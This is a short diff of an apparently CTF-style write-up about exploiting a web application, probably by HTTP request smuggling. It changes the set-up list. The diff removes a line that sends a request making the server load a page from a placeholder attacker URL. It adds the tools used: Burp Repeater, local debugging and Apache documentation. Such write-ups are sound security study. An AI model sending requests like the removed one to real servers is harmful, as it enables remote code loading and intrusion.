@@ -10,7 +10,9 @@ There is not a whole lot to this application. We're given the source code to loo
 
 ## Set Up
 
-1. Burpsuite Repeater/collaborator(Testing): GET requests to /render?use_remote=true&page=https://ATTACKER_URL/test.go.
+1. Burpsuite Repeater.
+2. Had to run the application locally for debugging purposes.
+3. Reading a lot of Apache documentation. 
 
 ## Exploit
 <img src= "exploited_html_)smuggling.PNG">
